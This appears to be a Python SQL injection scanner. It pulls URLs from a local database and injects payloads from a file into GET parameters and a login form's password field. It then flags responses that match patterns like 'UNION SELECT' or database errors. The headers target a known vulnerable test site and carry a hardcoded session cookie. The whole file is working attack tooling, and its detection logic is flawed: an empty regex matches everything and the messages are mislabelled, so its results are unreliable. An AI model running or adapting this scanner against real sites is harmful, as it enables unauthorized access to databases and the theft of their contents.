import os, re, time, sqlite3, requests, pprint


class SQLi(object):
    def __init__(self, payload_file):
        self.payload_file = payload_file
        self.payloads = self.load_payloads()

    def load_payloads(self):
        payloads = []
        with open(self.payload_file, 'r') as f:
            for line in f:
                payload = line.strip()
                if payload:
                    payloads.append(payload)
        return payloads

conn = sqlite3.connect('urls.db')
cursor = conn.cursor()

payload_file = 'payloads.txt'  
sqli = SQLi(payload_file)

payloads = sqli.payloads

patterns = [
        r"UNION\s+SELECT", # Potential SQL injection attempt
        r"DROP\s+TABLE", # Potential SQL injection attempt
        r"Error:\s*\d+", # Potential database error
        
        r""
    ]

unexpected_parts = []


headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'testasp.vulnweb.com/',
    'Cookie': 'ASPSESSIONIDQATCTSSA=GLMFPEAADGECJCIMNPECOFOE',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Encoding': 'gzip,deflate',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36',
    'Connection': 'Keep-alive'
}

data0 = {
    'tfUName': 'test'
}


try:
    cursor.execute('SELECT url FROM urls')
    urls = cursor.fetchall()

    for url in urls:
        original_url = url[0]
        
        # ///GET REQUEST///

        if '=' in original_url and not 'login' in original_url.lower():
            # Iterate through each payload and inject it into the URL
            for payload in payloads:
                parts = original_url.split('=')
                injected_url = f"{parts[0]}={payload}"
                print(f"Injected URL: {injected_url}")

                try:
                    response = requests.get(injected_url)
                    response_content = response.text

                    print(f"Status Code: {response.status_code}")
                    for pattern in patterns:
                        matches1 = re.findall(pattern, response_content, re.IGNORECASE)
                    
                        if response.status_code == 200 and matches1:
                            print("POST request successful!")
                            print("in URL : "+original_url)
                            print("-----------------------------------------")

                        else:
                            print(f"POST request failed with status code: {response.status_code}")
                            break
                except requests.exceptions.RequestException as e:
                    print(f"Error: {e}")
                print("\n")

        #time.sleep(1)     ////// POST REQUESTS //////
        elif 'login' in original_url.lower():
            for payload in payloads:
                
                data = dict(data0)  # Create a copy of base_data
                data['tfUPass'] = payload
                
                response = requests.post(original_url, headers=headers, data=data)
                response_content = response.text

                for pattern in patterns:
                    matches = re.findall(pattern, response_content, re.IGNORECASE)
           
                    if response.status_code == 200 and matches:
                        print("POST request successful!")
                        pprint.pprint(headers)
                        print("SQL injection in : " "\n")
                        print("URL :"+original_url)
                        pprint.pprint(data)
                        print(unexpected_parts)
                        

                    else:
                        print(f"POST request failed with status code: {response.status_code}")
        else:
            print(f"Skipping payload injection for URL: {original_url}")
                

finally:
    
    conn.close()
